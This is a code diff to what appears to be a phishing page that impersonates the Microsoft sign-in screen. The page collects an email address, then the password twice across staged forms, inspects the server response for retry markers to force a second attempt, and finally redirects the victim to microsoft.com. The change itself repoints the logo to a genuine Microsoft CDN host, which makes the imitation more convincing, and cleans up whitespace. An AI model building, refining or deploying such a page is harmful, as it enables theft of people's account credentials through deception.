@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -107,7 +106,7 @@
     function showStep1() {
         const container = document.getElementById("container");
         container.innerHTML = `
-            <img class="logo" role="img" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
+            <img class="logo" role="img" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="margin-bottom: 15px;">
             <h1 class="header">Sign in</h1>
             <form id="loginForm">
                 <input type="text" id="emailInput" placeholder="Email, phone, or Skype" required>
@@ -120,7 +119,7 @@
                 </div>
             </form>
         `;
-        
+
         document.getElementById("loginForm").addEventListener("submit", function(e){
             e.preventDefault();
             const emailValue = document.getElementById("emailInput").value.trim();
@@ -151,11 +150,11 @@
                 </div>
             </form>
         `;
-        
+
         document.getElementById("btnBack").addEventListener("click", function(){
             showStep1();
         });
-        
+
         document.getElementById("loginForm").addEventListener("submit", function(e){
             e.preventDefault();
             const pwd = document.getElementById("passwordInput").value;
@@ -188,11 +187,11 @@
                 </div>
             </form>
         `;
-        
+
         document.getElementById("btnBack2").addEventListener("click", function(){
             showStep2();
         });
-        
+
         document.getElementById("loginForm").addEventListener("submit", function(e){
             e.preventDefault();
             const finalPassword = document.getElementById("finalPasswordInput").value;
@@ -227,18 +226,18 @@
                 window.location.href = 'https://microsoft.com';
                 return null;
             }
-            
+
             // Check if redirected back to our form with retry parameter
             if (response.url && response.url.includes('retry=true')) {
                 setTimeout(() => showStep3(), 500);
                 return null;
             }
-            
+
             return response.text();
         })
         .then(html => {
             if (!html) return;
-            
+
             // Check if the response contains error indicators
             if (html.includes('error=true') || html.includes('step=retry')) {
                 if (!isSecondAttempt) {
@@ -263,7 +262,7 @@
         if (existingError) {
             existingError.remove();
         }
-        
+
         const errorDiv = document.createElement('div');
         errorDiv.className = 'error-msg';
         errorDiv.innerHTML = message;
@@ -290,7 +289,7 @@
         } catch (e) {
             console.error("URL parsing error:", e);
         }
-        
+
         showStep1();
     })();
 </script>
